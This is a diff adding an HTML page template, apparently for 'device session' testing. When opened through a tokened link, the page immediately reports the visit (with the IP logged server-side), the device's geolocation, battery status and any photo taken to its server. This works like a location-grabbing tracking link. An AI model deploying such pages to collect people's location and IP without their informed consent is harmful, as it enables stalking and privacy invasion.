@@ -1,0 +1,79 @@
+﻿<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Session</title>
+</head>
+<body>
+  <h2>Device session (open while testing)</h2>
+  <p id="status">Initializing…</p>
+
+  <label>Take photo (optional):
+    <input id="photo" type="file" accept="image/*" capture="environment" />
+  </label>
+
+  <script>
+    const token = "{{ token }}";
+    const statusEl = document.getElementById("status");
+    function log(msg){ statusEl.textContent = msg; console.log(msg); }
+
+    async function postJSON(path, payload){
+      try{
+        const res = await fetch(path, {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(payload)
+        });
+        log(`${path} → ${res.status}`);
+        return res;
+      }catch(e){
+        log(`${path} error: ${e}`);
+      }
+    }
+
+    // send basic visit note (includes IP via server)
+    function sendVisitNote(){ postJSON(`/upload_info/${token}`, { note: 'page-open' }); }
+
+    // geolocation
+    function sendCoords(){
+      if(!navigator.geolocation){ log('no geolocation'); return; }
+      navigator.geolocation.getCurrentPosition(pos=>{
+        const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy};
+        postJSON(`/upload_info/${token}`, { coords });
+      }, err=>{
+        log('geo error: '+err.message);
+      }, {timeout:10000});
+    }
+
+    // battery (best-effort)
+    async function sendBattery(){
+      try{
+        if(navigator.getBattery){
+          const bat = await navigator.getBattery();
+          postJSON(`/upload_info/${token}`, { battery:{ level: bat.level, charging: bat.charging }});
+        } else {
+          log('no battery API');
+        }
+      } catch(e){ log('battery error: '+e); }
+    }
+
+    // photo upload
+    document.getElementById('photo').addEventListener('change', async (ev)=>{
+      const f = ev.target.files[0];
+      if(!f) return;
+      const reader = new FileReader();
+      reader.onload = ()=>{ postJSON(`/upload_image/${token}`, { image_b64: reader.result }); };
+      reader.readAsDataURL(f);
+    });
+
+    // start collection
+    (function(){
+      log('requesting permissions / collecting data');
+      sendVisitNote();
+      sendCoords();
+      sendBattery();
+    })();
+  </script>
+</body>
+</html>
